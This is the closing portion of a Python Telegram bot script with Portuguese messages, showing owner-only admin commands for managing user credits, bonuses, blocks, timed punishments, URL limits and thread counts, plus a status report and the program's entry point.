            if tid is None: await _reply_adm("❌ Digite o ID."); return
            ok = revogar_punicao(tid)
            await _reply_adm(f"{'🔓 Punição revogada' if ok else 'ℹ️ Sem punição ativa'} para `{tid}`")

        elif estado == "adm_estender":
            _estados.pop(uid, None)
            tid, n = _parse_id_n(texto)
            if tid is None: await _reply_adm("❌ `<id> <segundos>`"); return
            expira  = estender_punicao(tid, n)
            exp_str = expira.strftime("%H:%M:%S")
            await _reply_adm(f"⏳ Punição de `{tid}` estendida +{n}s → expira `{exp_str}`")

        elif estado == "adm_rmcred":
            _estados.pop(uid, None)
            tid, n = _parse_id_n(texto)
            if tid is None: await _reply_adm("❌ `<id> <n>`"); return
            u = admin_rm_creditos(tid, n)
            dr = max(0, DEFAULT_CREDITOS - u["diarios_usados"])
            await _reply_adm(f"🗑 Removido {n} crédito(s) de `{tid}` → restante `{dr}/{DEFAULT_CREDITOS}`")

        elif estado == "adm_resetdia":
            _estados.pop(uid, None)
            tid, _ = _parse_id_n(texto, require_n=False)
            if tid is None: await _reply_adm("❌ Digite o ID."); return
            u = admin_reset_dia(tid)
            await _reply_adm(f"🔄 Diários de `{tid}` zerados | Bônus intacto: `{u.get('bonus',0)}`")

        else:
            # Owner sem estado — mostra menu admin
            cred_o  = cred_disponiveis(uid)
            await event.respond(
                f"\U0001f3e0 Menu admin\n\n"
                f"\U0001f39f Di\u00e1rios: `{cred_o['diarios_rest']}/{DEFAULT_CREDITOS}` | "
                f"\u2b50 B\u00f4nus: `{cred_o['bonus']}`",
                buttons=teclado_admin(), parse_mode="md"
            )

    # ══════════════════════════════════════════════════════════
    # COMANDOS RÁPIDOS ADMIN (texto direto, sem estado)
    # ══════════════════════════════════════════════════════════

    @bot.on(events.NewMessage(pattern=r"^/addbonus\s+(-?\d+)\s+(\d+)$"))
    async def cmd_addbonus(event):
        if not is_owner(event.sender_id): return
        u = admin_add_bonus(int(event.pattern_match.group(1)), int(event.pattern_match.group(2)))
        await event.respond(f"✅ Bônus → `{u['bonus']}`", parse_mode="md")

    @bot.on(events.NewMessage(pattern=r"^/setbonus\s+(-?\d+)\s+(\d+)$"))
    async def cmd_setbonus(event):
        if not is_owner(event.sender_id): return
        u = admin_set_bonus(int(event.pattern_match.group(1)), int(event.pattern_match.group(2)))
        await event.respond(f"✅ Bônus → `{u['bonus']}`", parse_mode="md")

    @bot.on(events.NewMessage(pattern=r"^/rmbonus\s+(-?\d+)\s+(\d+)$"))
    async def cmd_rmbonus(event):
        if not is_owner(event.sender_id): return
        u = admin_rm_bonus(int(event.pattern_match.group(1)), int(event.pattern_match.group(2)))
        await event.respond(f"✅ Bônus → `{u['bonus']}`", parse_mode="md")

    @bot.on(events.NewMessage(pattern=r"^/resetdia\s+(-?\d+)$"))
    async def cmd_resetdia(event):
        if not is_owner(event.sender_id): return
        u = admin_reset_dia(int(event.pattern_match.group(1)))
        await event.respond(f"✅ Zerado | Bônus: `{u.get('bonus',0)}`", parse_mode="md")

    @bot.on(events.NewMessage(pattern=r"^/seturls\s+(-?\d+)\s+(\d+)$"))
    async def cmd_seturls(event):
        if not is_owner(event.sender_id): return
        n = int(event.pattern_match.group(2))
        if not 1 <= n <= 50: await event.respond("❌ 1-50"); return
        u = admin_set_urls(int(event.pattern_match.group(1)), n)
        await event.respond(f"✅ URLs → `{u['max_urls']}`", parse_mode="md")

    @bot.on(events.NewMessage(pattern=r"^/setvel\s+(-?\d+)\s+(\d+)$"))
    async def cmd_setvel(event):
        if not is_owner(event.sender_id): return
        n = int(event.pattern_match.group(2))
        u = admin_set_threads(int(event.pattern_match.group(1)), n)
        await event.respond(f"✅ Velocidade → `{u['threads']}` threads", parse_mode="md")

    @bot.on(events.NewMessage(pattern=r"^/bloquear\s+(-?\d+)$"))
    async def cmd_bloquear(event):
        if not is_owner(event.sender_id): return
        uid = int(event.pattern_match.group(1))
        admin_bloquear(uid)
        await event.respond(f"🚫 `{uid}` bloqueado.", parse_mode="md")

    @bot.on(events.NewMessage(pattern=r"^/desbloquear\s+(-?\d+)$"))
    async def cmd_desbloquear(event):
        if not is_owner(event.sender_id): return
        uid = int(event.pattern_match.group(1))
        admin_desbloquear(uid)
        await event.respond(f"✅ `{uid}` desbloqueado.", parse_mode="md")

    @bot.on(events.NewMessage(pattern=r"^/punir\s+(-?\d+)(?:\s+(\d+))?$"))
    async def cmd_punir(event):
        if not is_owner(event.sender_id): return
        tid = int(event.pattern_match.group(1))
        dur = int(event.pattern_match.group(2) or PUNISH_DURATION)
        expira = punir_usuario(tid, dur)
        await event.respond(f"⏱ `{tid}` punido até `{expira.strftime('%H:%M:%S')}`", parse_mode="md")

    @bot.on(events.NewMessage(pattern=r"^/revogar\s+(-?\d+)$"))
    async def cmd_revogar(event):
        if not is_owner(event.sender_id): return
        uid = int(event.pattern_match.group(1))
        ok  = revogar_punicao(uid)
        await event.respond(f"{'🔓 Punição revogada' if ok else 'ℹ️ Sem punição'} para `{uid}`", parse_mode="md")

    @bot.on(events.NewMessage(pattern=r"^/estender\s+(-?\d+)\s+(\d+)$"))
    async def cmd_estender(event):
        if not is_owner(event.sender_id): return
        tid    = int(event.pattern_match.group(1))
        n      = int(event.pattern_match.group(2))
        expira = estender_punicao(tid, n)
        await event.respond(f"⏳ Estendido → expira `{expira.strftime('%H:%M:%S')}`", parse_mode="md")

    @bot.on(events.NewMessage(pattern=r"^/rmcred\s+(-?\d+)\s+(\d+)$"))
    async def cmd_rmcred(event):
        if not is_owner(event.sender_id): return
        u  = admin_rm_creditos(int(event.pattern_match.group(1)), int(event.pattern_match.group(2)))
        dr = max(0, DEFAULT_CREDITOS - u["diarios_usados"])
        await event.respond(f"🗑 Créditos → `{dr}/{DEFAULT_CREDITOS}`", parse_mode="md")

    @bot.on(events.NewMessage(pattern=r"^/credito\s+(-?\d+)$"))
    async def cmd_credito(event):
        if not is_owner(event.sender_id): return
        uid  = int(event.pattern_match.group(1))
        cred = cred_disponiveis(uid)
        u    = get_info(uid)
        punido, rest = esta_punido(uid)
        blq  = "🚫 BLOQUEADO" if u.get("bloqueado") else ("⏳ PUNIDO" if punido else "✅ Normal")
        await event.respond(
            f"📊 **Usuário `{uid}`:**\n\n"
            f"📅 Diários: `{cred['diarios_rest']}/{DEFAULT_CREDITOS}`\n"
            f"⭐ Bônus: `{cred['bonus']}`\n"
            f"🔋 Total: `{cred['total']}`\n"
            f"🔗 URLs: `{u.get('max_urls', DEFAULT_MAX_URLS)}`\n"
            f"⚡ Velocidade: `{u.get('threads', DEFAULT_THREADS)}` threads\n"
            f"🛡 Status: {blq}"
            + (f"\n⏱ Punição expira em: `{rest}s`" if punido else ""),
            parse_mode="md")

    @bot.on(events.NewMessage(pattern=r"^/status$"))
    async def cmd_status(event):
        if not is_owner(event.sender_id): return
        n_hosts = len(carregar_hosts(embaralhar=False))
        try:
            with open(BANCO_FILE, "r") as bf:
                n_banco = sum(1 for l in bf if l.strip())
        except Exception:
            n_banco = 0
        await event.respond(
            f"📊 **Status v6.0**\n\n"
            f"📋 Hosts: `{n_hosts}`\n"
            f"💾 Banco: `{n_banco}` entradas\n"
            f"👥 Usuários: `{len(admin_listar())}`\n"
            f"🔄 Ativas: `{len(_em_andamento)}`\n"
            f"🛡 Punições: `{len(_punicoes)}`\n"
            f"🧵 Threads padrão: `{DEFAULT_THREADS}`\n"
            f"🕐 `{datetime.now().strftime('%d/%m/%Y %H:%M:%S')}`",
            parse_mode="md")

    print("✅ Bot online — aguardando usuários!\n")
    await bot.run_until_disconnected()


# ══════════════════════════════════════════════════════════════
# ENTRY POINT
# ══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Bot encerrado.")
        log("Encerrado pelo usuário.", "SYSTEM")
    except Exception:
        log(f"Erro fatal: {traceback.format_exc()}", "FATAL")
        raise

# python Migrador_bot_oficial_3.py
# Comandos úteis:
# cp ~/storage/downloads/Migrador_bot_oficial_3.py ~/
# ls -la ~/Migrador_bot_oficial_3.py
# python Migrador_bot_oficial_3.py
